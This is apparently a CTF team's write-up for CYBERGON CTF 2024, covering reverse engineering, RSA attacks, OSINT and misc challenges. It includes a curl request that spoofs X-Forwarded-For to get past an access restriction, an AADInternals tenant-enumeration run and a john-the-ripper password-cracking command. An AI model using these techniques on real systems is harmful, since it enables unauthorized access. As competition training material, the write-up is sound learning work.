![image](https://hackmd.io/_uploads/SkiS81s7kg.png)

To solve this challenge, i reconstructed the hash algorithm on a python code then use Z3 solver to find the correct input block data, each block consists of 4 bytes data (DWORD). 

```python=
from Crypto.Util.number import long_to_bytes
from z3 import *


def _rol(val, bits, bit_size):
    return (val << bits % bit_size) & (2**bit_size - 1) | (
        (val & (2**bit_size - 1)) >> (bit_size - (bits % bit_size))
    )


def _ror(val, bits, bit_size):
    return ((val & (2**bit_size - 1)) >> bits % bit_size) | (
        val << (bit_size - (bits % bit_size)) & (2**bit_size - 1)
    )

__ROR4__ = lambda val, bits: _ror(val, bits, 32)
__ROL4__ = lambda val, bits: _rol(val, bits, 32)

enc_flag = [
    0x0380BB5B,
    0xCE0ACB02,
    0x89F8DB58,
    0x47D24019,
    0x560EEFBE,
    0x2E41D64E,
    0x9E0E14EB,
    0xEB33ABA8,
    0x67739FF5,
    0x8C9A5B38,
    0xEEA329C8,
    0xE97BC2E9,
]

initial_value = 0xC0FFEE
constant = 0x9E3779B9

v10 = initial_value

gen_array = []

key = "LMFAO_OAFML"
for i in range(len(key)):
    v10 = __ROL4__((ord(key[i]) ^ v10), 3) ^ constant
    gen_array.append(hex(v10))

for i in range(11, 256):
    v10 = __ROL4__(__ROL4__(v10, (i & 7) + 1) ^ v10, 3) ^ 0x9E3779B9
    gen_array.append(hex(v10))

out = []
a3 = BitVecVal(initial_value, 32)

initial_value = BitVecVal(initial_value, 32)

solver = Solver()
v26 = [BitVec(f"v26_{i}", 32) for i in range(12)]

solver.add(v26[0] == 0x43594245) # CBYE
solver.add(v26[1] == 0x52474f4e) # RGON
solver.add(v26[2] == 0x5f435446) # _CTF
solver.add(v26[3] == 0x32303234) # 2024

for i in range(0, 12):
    solver.add(v26[i] & 0xFF > 20)
    solver.add(v26[i] & 0xFF < 127)
    solver.add(v26[i] >> 8 & 0xFF > 20)
    solver.add(v26[i] >> 8 & 0xFF < 127)
    solver.add(v26[i] >> 16 & 0xFF > 20)
    solver.add(v26[i] >> 16 & 0xFF < 127)
    solver.add(v26[i] >> 24 & 0xFF > 20)
    solver.add(v26[i] >> 24 & 0xFF < 127)

for v25 in range(0, 48, 4):
    a3 = (
        RotateLeft(a3, 13)
        ^ RotateRight(v26[v25//4], 7)
        ^ (
            BitVecVal(int(gen_array[v25 + 2], 16), 32)
            + RotateRight(v26[v25//4] + BitVecVal(int(gen_array[v25 + 1], 16), 32), a3 & 0xF)
            * (BitVecVal(int(gen_array[v25], 16), 32) ^ RotateLeft(a3 ^ v26[v25//4], v25))
        )
    ) & 0xFFFFFFFF
    solver.add(a3 == enc_flag[v25//4])


if solver.check() == sat:
    model = solver.model()
    out = [model[v26[i]] for i in range(12)]
    for i in out:
        print(long_to_bytes(i.as_long()).decode(), end="")
```
In the Z3 solver equation, I added some conditions to ensure that the input block data consists only of printable strings. I also included the known plaintext `CYBERGON_CTF2024` in the first four input blocks to make it faster solve process and most importantly, here i use the built-in function of Z3, `RotateLeft()` and `RotateRight()` because Z3 can't solve the equation if i use `__ROL4__` and `__ROR4__` function that i have made before.

Flag: `CYBERGON_CTF2024{YSL5EUwe![Ha@&{ZSky-w$w7+1Uz4%}`

# Cryptography

## Warm Up
![image](https://hackmd.io/_uploads/BkDdj7iXkl.png)

Flag : `CYBERGON_CTF2024{b45392_h3x_b1n4ry}`
## Warm Up 1
![image](https://hackmd.io/_uploads/rJTiiXsXke.png)
![image](https://hackmd.io/_uploads/SJXgnQsQ1x.png)

Flag : `CYBERGON_CTF2024{br41nfuck_0r_wh1t35p4c3?}`
## Warm Up 2
![image](https://hackmd.io/_uploads/Sy6ihQim1l.png)

Flag : `CYBERGON_CTF2024{1t_15_4ll_4b0ut_tw1n}`

## Chill Bro

In this challenge we need do decode the dancing man cipher by sherlock holmes. we can use the online tools for the decode that cipher. In this case we use [this](https://www.dcode.fr/dancing-men-cipher) 

![image](https://hackmd.io/_uploads/rJVJZg1Vkl.png)

Flag: `CYBERGON_CTF2024{TAKEABREAKBROLETSDANCE}`


## E45y p345y

To be able to decode the ciphertext, we can use [dcode.fr](https://www.dcode.fr/rail-fence-cipher) Rail Fence (Zig-Zag) Cipher decoder

![image](https://hackmd.io/_uploads/BJWHUBiQ1x.png)


## RSA 1

The same modulus N is used to encrypt the same plaintext m (only e value is different) and e1 and e2 are comprime. So we can use Common Modulus Attack.

```python=
from sympy import gcdex
from Crypto.Util.number import long_to_bytes

n = 157508528276758767638734754424621334466394815259243977959210580239577661657714722726225362774231543920376913579658052494826650164280151836289734452590647102313381584133512835595817708427222746495824286741840967127393187086028742577763080469063534742728547285121808241078515099307495843605080694383425986909029
cip1 = 69950256754119187070741220414057295159525964023691737870808579797990094306696842507546591858691032981385348052406246203530192324935867616305070637936848926878022662082401090988631324024964630729510728043900454511012552105883413265919300434674823577232105833994040714469215427142851489025266027204415434792116
cip2 = 26975575766224799967239054937673125413993489249748738598424368718984020839138611191333159231531582854571888911372230794559127658721738810364069579050102089465873134218196672846627352697187584137181503188003597560229078494880917705349140663228281705408967589237626894208542139123054938434957445017636202240137
e1 = 0x10003
e2 = 0x10001

a, b, gcd = gcdex(e1, e2)

m = (pow(cip1, int(a), n) * pow(cip2, int(b), n)) % n
print(long_to_bytes(m))
```

Flag: `CYBERGON_CTF2024{54m3_m0Du1u5!!!!!}`

## RSA 2

First equation:
$$
A  = (\text{p} \cdot \text{value3} + \text{value4}) \mod \text{value2}
$$$$
B  = (\text{A} \cdot \text{value3} + \text{value4}) \mod \text{value2}
$$$$
C  = (\text{B} \cdot \text{value3} + \text{value4}) \mod \text{value2}
$$

Make an equation for value4:

$$
value4 = C - (B \cdot value3) \mod value2
$$

Use `value4` for subtitution:

$$
B = (A \cdot value3 + C - B \cdot value3) \mod value2
$$$$
B - C = (A \cdot value3 - B \cdot value3) \mod value2
$$$$
B - C = ((A - B) \cdot value3) \mod value2
$$$$
((B - C) \cdot inverse(A - B)) \mod value2 = value3
$$

We get that $$value3 = ((B - C) \cdot inverse(A-B)) \mod value2$$

Note that, 
$$
\text{inverse}(x, m)
$$$$
x \cdot \text{inverse}(x, m) \equiv 1 \mod m
$$

If we already have the `value3`, we can recover `value4` then recover `p` factor. So we can get the `q` factor with 
$$
q = n \div p
$$

If we got all that value, find `phi` and get the value of `d` then just decrypt the ciphertext.


```python=
from Crypto.Util.number import inverse, long_to_bytes

n = 11222960521299588524750181772783274494136260187265706255449546453051590711140226315418489273605550786286866861213107560059068705390211163996521916889962843049465232723113513937161139708829580255839302498745553742822028219120815522776817194932205965607268871964492604160910360630823557368267758149998874303490258640254944041292488072709825912234589051956237101861393250166383288225471240410545441288641428317727282487089617398205216009066566291920484141970950043945692757053601681465771996222610983586467074641256505745938075296078516556647247578105282414665403694284697737212759109318373113013635864830591729084632299
e = 65537
enc = 4576734045815415117393714785631533893386989421975362873054714721973774635633807216351035380690773987036176885213178400507495200723424882273269742714702510936914814535126953769815835845599408528989444709086820755745243538401968889036685263510116853431754692979282106622905405182176002591188189168848540317758672663110614746587847277186013825393236023619071578716175239047234708469908780821882885343491830991331125549714754449771483301008011927254615527584621447108823713195265186077687379401023743186083665136488814637885852911584730913514513104311188825766310494436999295732392931981405989153709642320565431642748272
A = value1_1 = 66953810142124815039330074236499310261872548478302540667230702366186795585053774076152555207345970575178148375832595166215236604690676109828736048475386794816121161445406948904951500098521882759834245621717603117359421674234377857916939480197431736700748894114250914875188652571151182449577867725826435423376
B = value1_2 = 80999476520674190840911057419847921359566717270329166665621275349092808316592952277886549172728262124841911886139982215089830102691377787521599010936244643996656761544283935771839177079576174490525422747341176363336559517593590536935078419089993487286051416549535034924351610990671702249465937149523440124761
C = value1_3 = 51216023802572567348628656925016052173207334859206588426719337944930296970754512831792094175558169025945510177730916662495838051702454240459586473357970507711891978175281288898510022166090248248871780043046413003302051163128527408141107396660111207921123000905106255749641830317142711784497262578942366553634

value2 = 2**1024

# A = (p * value3 + value4) mod value2
# B = (A * value3 + value4) mod value2
# C = (B * value3 + value4) mod value2

value3 = (B - C) * inverse(A - B, value2) % value2
value4 = (B - A * value3) % value2
p = (A - value4) * inverse(value3, value2) % value2

q = n // p

phi_n = (p - 1) * (q - 1)
d = inverse(e, phi_n)

pt_int = pow(enc, d, n)
pt = print(long_to_bytes(pt_int).decode())
```

Flag: `CYBERGON_CTF2024{C0nGr47uL4710N_y0u_g07_17!!!}`

## I Love Poetry

There is a txt file that contain a cipher text and the key for the decryption like below. 

```
Have you ever heard of a tale so sly,
Of secrets hidden in verses high?
A whispered cipher, a rhyme obscure,
Words that echo, silent yet sure.
You wander through lines, seeking the key,
Patterns concealed for those who see.
Could it be found, the lock of lore,
A code within, you’ve not cracked before?
About the stanzas, the letters play,
A dance of words to keep truth at bay.
Have you the courage, the sight so clear,
To unveil what’s buried so near?
Each phrase a puzzle, each line a clue,
The poem waits – it speaks to you.
And once you've solved the riddle's core,
A cipher unlocked, forevermore.

MTE6MSAxNDo3IDE6MyAxOjQgNzo1IDE0OjIgMzoz
```

After decrypting the encrypted key with base64 decode we got an actual key. 

```
11:1 14:7 1:3 1:4 7:5 14:2 3:3
```

and we know that the key refer to the line and the row from the poetry, like example we got `11:7` thats mean we take 11th sentences and choose 7th word of that sentence. After doing it for the whole key, we got the flag

Flag: `CYBERGON_CTF2024{Have you ever heard the poem cipher}`

# HTTP

## Trespasser

Based on the description, we need to access `backend.intelbyte.io` using a specific DNS server.

At first, I performed multiple trial-and-error attempts with various headers and values, such as:

- X-Forwarded
- Forwarded
- Host
- etc.

We also tried using different DNS resolvers, such as Google (8.8.8.8).

Eventually, we managed to bypass the restriction by using this header
```
X-Forwarded-For: 1.1.1.1
```

The IP 1.1.1.1 is a public DNS resolver operated by Cloudflare.

```
daffainfo@dapOS:~$ curl -H "X-Forwarded-For: 1.1.1.1" https://backend.intelbyte.io
CYBERGON_CTF2024{3434-rvq34-5sdaf-ga4vw!}
```

Flag: `CYBERGON_CTF2024{3434-rvq34-5sdaf-ga4vw!}`

# Bonus

## Where are you now

In this challenge, we have to post something in our social media and do some tagging in that post and also send proof to one of the admin. 

![image](https://hackmd.io/_uploads/Syc4fg141x.png)

Flag: `CYBERGON_CTF2024{th4nk5_4_y0ur_4ppr3c14t!0n}`

# Reconnaissance

## Secure Life

In this challenge, we have to look up the expiration date of that certificate, we can look up the certificate by opening the file. 

![image](https://hackmd.io/_uploads/BydL9qfVJl.png)

we can see the expiration date in that valid to value

Flag: `CYBERGON_CTF2024{2039:11:25:03:38:00}`

## Validation

We can utilize SPF Record lookup tools like https://dnschecker.org/all-dns-records-of-domain.php to determine the number of TXT and SPF records in flaghhunt.lol

![image](https://hackmd.io/_uploads/SkthnSsXkl.png)

Flag: `CYBERGON_CTF2024{4:1}`


## Leakage

We need to search `api.flaghunt.lol` string on Github using Github search and we got 1 result from a user called `dummybear00`

![image](https://hackmd.io/_uploads/ryiUjBsX1l.png)

Inside the `kubernetes-config` file, there is a flag inside the `api-key` JSON property

![image](https://hackmd.io/_uploads/S1caoSjmye.png)

Flag: `CYBERGON_CTF2024{34af-atg4-34gs-f234g-79g6}`

## Uncover

To leak the tenant information, we used [AADInternals](https://github.com/Gerenios/AADInternals) tools to enumerate Tenant brand, Tenant ID, Tenant Name, etc.

```
PS C:\Users\Public\AADInternals> Import-Module -Name "AADInternals"                                           ___    ___    ____  ____      __                        __
   /   |  /   |  / __ \/  _/___  / /____  _________  ____ _/ /____
  / /| | / /| | / / / // // __ \/ __/ _ \/ ___/ __ \/ __ `/ / ___/
 / ___ |/ ___ |/ /_/ _/ // / / / /_/  __/ /  / / / / /_/ / (__  )
/_/  |_/_/  |_/_____/___/_/ /_/\__/\___/_/  /_/ /_/\__,_/_/____/

 v0.9.4 by @DrAzureAD (Nestori Syynimaa)
PS C:\Users\Public\AADInternals> Invoke-AADIntReconAsOutsider -DomainName intelbyte.io | Format-Table
Tenant brand:       Default Directory
Tenant name:        cloudera9999gmail.onmicrosoft.com
Tenant id:          fabd5e4d-f128-4bac-9005-60944deb9112
Tenant region:      AS
DesktopSSO enabled: False
MDI instance:       cloudera9999gmail.atp.azure.com

Name                               DNS    MX  SPF DMARC  DKIM MTA-STS Type    STS
----                               ---    --  --- -----  ---- ------- ----    ---
cloudera9999gmail.onmicrosoft.com True False True False False   False Managed
goddamnit2024.onmicrosoft.com     True  True True False False   False Managed
intelbyte.io                      True False True False False   False Managed
```

Flag: `CYBERGON_CTF2024{goddamnit2024.onmicrosoft.com}`

# TI

## Ransomware

From the challenge description, i searched it on browser and i got this.

![image](https://cdn.discordapp.com/attachments/1017355321318064199/1314892688264269825/image.png?ex=67556cbe&is=67541b3e&hm=3091c039b78a5f6780f858be941edd05dd07877d7dc8a22b97896b380d7a4563&)

After reading this [article](https://unit42.paloaltonetworks.com/threat-assessment-blacksuit-ransomware-ignoble-scorpius/?pdf=download&lg=en&_wpnonce=e952b7f248) i got all of the answers from the challnge description.

- Mutex
  ![image](https://hackmd.io/_uploads/Bky12c-4yl.png)

- Encryption Algorithm
  ![image](https://hackmd.io/_uploads/Bk3gh9ZEyg.png)

- Dump Tool
  ![image](https://hackmd.io/_uploads/rJKG3cZN1x.png)



Flag: `CYBERGON_CTF2024{Global\WLm87eV1oNRx6P3E4Cy9_OpenSSL AES_NanoDump}`

## RDP

After doing some research, we got all of the information from one of the [Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2024/10/29/midnight-blizzard-conducts-large-scale-spear-phishing-campaign-using-rdp-files/)

- Signature:
![image](https://hackmd.io/_uploads/ByCVpHjXyl.png)

- RDP Files, 15 files:
![image](https://hackmd.io/_uploads/Syx_arjmJl.png)

- Sender Domain, 5 domains:
![image](https://hackmd.io/_uploads/B1BtTHsmkx.png)

- APT Name:
![image](https://hackmd.io/_uploads/rk7MAroXyl.png)

Flag: `CYBERGON_CTF2024{Backdoor:Script/HustleCon.A_15_05_APT29}`

# OSINT

## The Pagoda
Use google lens to reverse search the given image.

it's detected as `Anada Temple`, now open what3words site and search Ananda Temple on that site, in the top left, you will see `Donation Center` and click the box at the top left corner of the location and you will get `///doorstops.overthrows.folder` as 3words.

![image](https://hackmd.io/_uploads/SJ-bINo7kg.png)

To find how many buddhas statue on that temple and what the name of all buddha statue. We can find it on the [wikipedia](https://en.wikipedia.org/wiki/Ananda_Temple).
![image](https://hackmd.io/_uploads/rJqaUNimyl.png)

Flag : `CYBERGON_CTF2024{doorstops.overthrows.folder_4_Gautama_Kakusandha_Kassapa_Konagamana}`

## Favorite Journal

In this challenge, we got this image:

![image](https://hackmd.io/_uploads/S1sjktG4ke.png)


Im using the reverse image in google lens and found this helpful website -> https://shwetoon.com/read/shwe-thway/shwe-thway-vol-1/chapter-1?locale=en

we have to find the regisration number and the publised date, for the published date we can find it in the top right corner and translate it from burmese word into number

![image](https://hackmd.io/_uploads/Hk5hlYGVkl.png)

![image](https://hackmd.io/_uploads/S1lpeKMN1l.png)

it says `4-1-69`
for the registration number, we can search up in the bottom of the page:

![image](https://hackmd.io/_uploads/Sy--WYz4Je.png)

Flag: `CYBERGON_CTF2024{4-1-69_1480}`

## The Statue
Reverse image search using google lens.
![image](https://hackmd.io/_uploads/ByUxO9-Nkl.png)

Then use google street view feature to find the spicific place coordinates.

![image](https://hackmd.io/_uploads/H125O5bEJe.png)

![image](https://cdn.discordapp.com/attachments/1017355321318064199/1314890159480901663/image.png?ex=67556a63&is=675418e3&hm=671dcb61479c6665ac337ee8f04bca10e1e5992e1c58a7fbdfb4e742f351068e&)

Flag: `CYBERGON_CTF2024{22.0801_95.2885}`


## The Train & The 

we are given to attachment iincluding video and the train:

![image](https://hackmd.io/_uploads/HJFobFzNye.png)

we look up after the train and found the exact same photo of the train. 

[TrainPhoto](https://www.bahnbilder.de/bild/myanmar-burma~dieselloks~br-df-1207/757882/df-1237-bago-020102.html)

and we can get the build year of the train 
![image](https://hackmd.io/_uploads/H1mD4FMEJx.png)

for the next video, we can get the first release date and the name of the bridge name by reverse image of the video with google lens, and founf this youtube video https://www.youtube.com/watch?v=CVDQxEogv2E

and the bridge name is `goteik` and first release date was `09-05-2019

Flag: `CYBERGON_CTF2024{1969_goteik_09-05-2019}`

## Vacation (1)
Reverse image search using google lens.
![image](https://hackmd.io/_uploads/B13HOViXke.png)

One of the result is from `tripadvisor.com`, open it, and you will find the hotel name.
![image](https://hackmd.io/_uploads/B1uc_Eomyg.png)

Search it on google to find the name of the city where the hotel is located.
![image](https://hackmd.io/_uploads/HyRgK4s7kg.png)

Flag : `CYBERGON_CTF2024{Muong Thanh Luxury Ha Long Centre Hotel, Ha Long, Vietnam}`
## Vacation (2)
While my teammate was working on the DFIR challenge, he found a similar photo on the facebook.

https://www.facebook.com/photo/?fbid=27719352727709270&set=a.510173815720529

Scrolling his facebook, we will find that he visited Sun World Ha Long Park on November 21st, 2024.

![image](https://hackmd.io/_uploads/Sy8dHqZNyg.png)

After a long time search, i found this article https://www.vietnam.vn/en/co-gi-tai-lang-ren-than-kiem-dang-gay-sot-tai-ha-long/.

![image](https://hackmd.io/_uploads/S1DcIcZEyg.png)

After read the article, we know that the place is on Làng Rèn Thần Kiếm.

Flag: `CYBERGON_CTF2024{Làng Rèn Thần Kiếm}`


## History repeats itself

In thi challenge, we need to find when does the photo take place. First of all we use revgerse image from google lens an d found something interesting like below:

![image](https://hackmd.io/_uploads/BkKSFqGVkx.png)

And open up the link, and found that the photo is one of important event in burma history, `Panglong Agreement`

![image](https://hackmd.io/_uploads/H1vUK5MN1l.png)

and search up in the google for the exact date. 

![image](https://hackmd.io/_uploads/BJDPF9zNJl.png)

Flag: `CYBERGON_CTF2024{February_12_1947}`


# MISC

## Sponsor
Found a youtube link on [CYBERGON CTF 2024 ctftime event](https://ctftime.org/event/2560/).

![image](https://hackmd.io/_uploads/ryz6NEsm1l.png)

Nearly the end of the video, we will find the flag written on notepad.

![image](https://hackmd.io/_uploads/S1uqNVsmJx.png)
S
Flag : `CYBERGON_CTF2024{h3llfir3_p4cific_gm4_alt3r_creatig0n}`

## Zip Zap

To solve this challenge, I asked chadgpt to generate a python code to extract the nested password-protected zip file

```python
import os
import pyzipper

def extract_zip(zip_path, password):
    """ Extracts a password-protected zip file to the current directory. """
    with pyzipper.AESZipFile(zip_path) as zf:
        zf.setpassword(password.encode())
        zf.extractall()  # Extract to the current directory
        return zf.namelist()  # Returns the list of filenames inside the zip

def get_password_from_zip(zip_path):
    """ Extracts the password from the last character of the filename inside the zip file. """
    with pyzipper.AESZipFile(zip_path) as zf:
        # Get the list of filenames inside the zip
        filenames = zf.namelist()
        if filenames:
            filename = filenames[0]  # Assuming the first file's name is the one to extract password from
            return filename[-5]  # Get the 5th-to-last character as the password
        else:
            raise ValueError(f"No files found in {zip_path}, cannot extract password.")

def extract_nested_zips(start_zip_path):
    """ Recursively extracts nested zip files using the last character of the filename as the password. """
    current_zip_path = start_zip_path
    
    while current_zip_path:
        # Extract the password from the current zip file (based on the last character of the filename inside it)
        password = get_password_from_zip(current_zip_path)
        print(f"Extracting {current_zip_path} using password: '{password}'")

        # Extract the current zip file
        extract_zip(current_zip_path, password)
        
        # Find the next zip file in the current directory
        extracted_files = os.listdir()

        # Check if there is another zip file in the directory (assuming one exists)
        next_zip_file = next((f for f in extracted_files if f.endswith('.zip')), None)
        
        # If no more zip file found, stop the extraction process
        if not next_zip_file:
            print(f"No further zip files found in the current directory. Stopping.")
            break
        
        # Update the current zip path for the next iteration
        current_zip_path = next_zip_file

if __name__ == "__main__":
    start_zip = "500.zip"  # Change this to your starting zip file
    extract_nested_zips(start_zip)
```

Run the code, and wait until you extracted all the file. The flag is located in the password zip file called `xxx. The password is` to file called `xxx. The password is`

## Rules

Flag part 1
![image](https://hackmd.io/_uploads/rJGe49ZNJg.png)
![image](https://hackmd.io/_uploads/BJnbE9ZE1e.png)

Flag part 2
![image](https://hackmd.io/_uploads/SJBDVcWEJx.png)

Flag part 3
![image](https://hackmd.io/_uploads/r1PYNq-4yx.png)

Flag : `CYBERGON_CTF2024{d1sc0rd__p0rt4l_w3b}`

## Triple Quiz

We are given a password protected rar file. we can try to crack it using john the ripper.

```
rar2john Triple_Quiz.rar > cek.hash -> Extracting the hash of the rar file

john --wordlist=/usr/share/wordlists/rockyou.txt cek.hash -> cracking using rockyou
```

and we get the password `ICEMAN`

After extracting the `rar` file, we got a `.wav` file. By hearing it, I suspect that this audio is a morse code.

Let's try decode it using [Morse Code Decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) and we got this
`6 666 777 7777 33 9 444 8 44 8 66 444 66 33`

let's try using cipher identifier in dcode

![image](https://hackmd.io/_uploads/S1UISAF7Jx.png)

Flag: `CYBERGON_CTF2024{MORSEWITHTNINE}`

## Your Favorite Song

we are given by a random old chinese woman singing APT by rose and bruno mars, and the question in challenge is ` What does the song name mean in English?` and the the song means is `Apartment`